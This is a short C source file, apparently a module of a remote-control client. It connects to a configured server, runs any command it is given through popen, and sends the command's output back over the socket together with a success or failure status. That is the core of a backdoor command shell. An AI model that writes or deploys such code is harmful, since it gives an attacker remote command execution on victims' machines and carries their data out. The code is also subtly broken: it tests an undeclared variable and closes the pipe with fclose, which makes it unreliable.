#include "refect.h"
extern struct client_cfg cfg;
int cmdshell_mod(char *cmd)
{
	int sockfd;
	int nread;
	struct sockaddr_in addr;
	FILE *read_fp;
	char send_buf[BUF_SIZE + 1];
	int stat_val;

	sockfd = connect_server(cfg.res_port);
	if (sockfd < 0)
	{
		printf("Can't connect server, port %d \n", cfg.res_port);
		return -1;
	}
	read_fp = popen(cmd, "r");

	while((nread = fread(send_buf, 1, BUF_SIZE, read_fp)) > 0)
	{
		if (write(sockfd, send_buf, nread) == -1)
		{
			return -1;
		}
	}
	usleep(500000);
	if (wait_stat == 0)
	{
		if (write(sockfd, "CMDSHELL:SUCCESS\n",17 ) == -1)
		{
			return -1;
		}
	}
	else
	{
		if (write(sockfd, "CMDSHELL:FAILURE\n", 17) == -1)
		{
			return -1;
		}
	}
	close(sockfd);
	fclose(read_fp);

	return 0;
}

